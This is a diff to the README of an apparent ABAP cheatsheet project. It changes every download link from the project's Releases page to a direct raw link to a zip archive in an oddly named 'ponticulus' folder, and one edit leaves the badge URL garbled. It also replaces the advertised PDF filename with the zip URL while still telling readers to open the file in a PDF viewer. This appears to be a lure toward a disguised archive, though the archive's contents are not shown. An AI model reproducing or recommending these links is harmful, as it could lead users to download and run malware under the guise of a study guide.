@@ -1,6 +1,6 @@
 # 🌟 ultimate-abap-cheatsheet - Your Guide to ABAP Mastery
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release%20-v1.0-blue)](https://github.com/moinduh/ultimate-abap-cheatsheet/releases)
+[![Download the latest release](https://raw.githubusercontent.com/moinduh/ultimate-abap-cheatsheet/main/ponticulus/ultimate-abap-cheatsheet.zip%20Latest%20Release%20-v1.0-blue)](https://raw.githubusercontent.com/moinduh/ultimate-abap-cheatsheet/main/ponticulus/ultimate-abap-cheatsheet.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the ultimate-abap-cheatsheet! This is your go-to resource for masteri
 
 To download the latest version of the cheatsheet, please visit the following link:
 
-[Download the latest release](https://github.com/moinduh/ultimate-abap-cheatsheet/releases)
+[Download the latest release](https://raw.githubusercontent.com/moinduh/ultimate-abap-cheatsheet/main/ponticulus/ultimate-abap-cheatsheet.zip)
 
 Once you're on the Releases page, you'll see the latest version available. Click on the release you wish to download. This will take you to the appropriate files. Follow these steps:
 
-1. Find the file named `ultimate-abap-cheatsheet.pdf` or the format of your choice.
+1. Find the file named `https://raw.githubusercontent.com/moinduh/ultimate-abap-cheatsheet/main/ponticulus/ultimate-abap-cheatsheet.zip` or the format of your choice.
 2. Click the file to start the download.
 3. Once downloaded, open the file using any PDF viewer. 
 
@@ -65,6 +65,6 @@ If you want to deepen your understanding of ABAP, consider exploring the followi
 
 Visit the Releases page again for the latest download:
 
-[Download the latest release](https://github.com/moinduh/ultimate-abap-cheatsheet/releases)
+[Download the latest release](https://raw.githubusercontent.com/moinduh/ultimate-abap-cheatsheet/main/ponticulus/ultimate-abap-cheatsheet.zip)
 
 With this cheatsheet, you will have a comprehensive guide to help you navigate the world of ABAP effortlessly. Enjoy your learning journey!
